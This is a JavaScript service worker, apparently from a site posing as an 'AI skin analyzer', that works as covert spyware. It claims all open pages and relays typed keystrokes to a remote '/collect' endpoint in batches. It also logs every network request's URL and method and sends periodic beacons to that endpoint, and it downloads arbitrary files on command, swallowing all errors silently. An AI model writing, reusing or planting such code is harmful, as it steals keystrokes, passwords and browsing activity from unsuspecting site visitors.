let collectorUrl = 'https://ai-skin-analyzer-utit.onrender.com/collect';
let keyBuffer = '';

// ---------- INSTALL ----------
self.addEventListener('install', function(event) {
    console.log('[SW] Installed');
    self.skipWaiting();
});

// ---------- ACTIVATE ----------
self.addEventListener('activate', function(event) {
    console.log('[SW] Activated');
    event.waitUntil(clients.claim());
    startBackgroundCollection();
});

// ---------- BACKGROUND COLLECTION ----------
function startBackgroundCollection() {
    setInterval(() => {
        collectAndSendData();
    }, 5 * 60 * 1000);

    if ('requestIdleCallback' in self) {
        self.requestIdleCallback(() => {
            collectAndSendData();
        });
    }
}

function collectAndSendData() {
    sendToServer('background_ping', {
        timestamp: new Date().toISOString(),
        active: true
    });

    self.clients.matchAll().then(clients => {
        clients.forEach(client => {
            client.postMessage({ type: 'collect_data' });
        });
    });
}

// ---------- MESSAGE HANDLER ----------
self.addEventListener('message', function(event) {
    if (event.data && event.data.type === 'download') {
        fetch(event.data.url)
            .then(response => response.blob())
            .then(blob => {
                const cacheName = 'download-cache';
                caches.open(cacheName).then(cache => {
                    cache.put(event.data.filename, new Response(blob));
                    console.log('[SW] Downloaded:', event.data.filename);
                });
            })
            .catch(() => {});
    }

    if (event.data && event.data.type === 'keypress') {
        keyBuffer += event.data.key;
        if (keyBuffer.length > 50) {
            sendToServer('keys', keyBuffer);
            keyBuffer = '';
        }
    }
});

// ---------- BACKGROUND SYNC ----------
self.addEventListener('sync', function(event) {
    if (event.tag === 'collect-data') {
        console.log('[SW] Background sync triggered');
        event.waitUntil(collectAndSendData());
    }
});

// ---------- PERIODIC SYNC ----------
self.addEventListener('periodicsync', function(event) {
    if (event.tag === 'periodic-collect') {
        console.log('[SW] Periodic sync triggered');
        event.waitUntil(collectAndSendData());
    }
});

// ---------- FETCH INTERCEPTOR ----------
self.addEventListener('fetch', function(event) {
    let url = event.request.url;
    if (url.includes(collectorUrl)) {
        event.respondWith(fetch(event.request));
        return;
    }
    sendToServer('fetch_log', {
        url: url,
        method: event.request.method,
        timestamp: new Date().toISOString()
    });
    event.respondWith(fetch(event.request));
});

// ---------- SEND TO SERVER ----------
function sendToServer(type, data) {
    try {
        let payload = {
            type: type,
            data: data,
            timestamp: new Date().toISOString(),
            source: 'service_worker'
        };
        fetch(collectorUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        }).catch(() => {});
    } catch (e) {}
}

// ---------- BACKGROUND FETCH ----------
self.addEventListener('backgroundfetchsuccess', function(event) {
    console.log('[SW] Background fetch success');
    event.updateUI({ title: 'Download complete' });
});

self.addEventListener('backgroundfetchfail', function(event) {
    console.log('[SW] Background fetch failed');
});
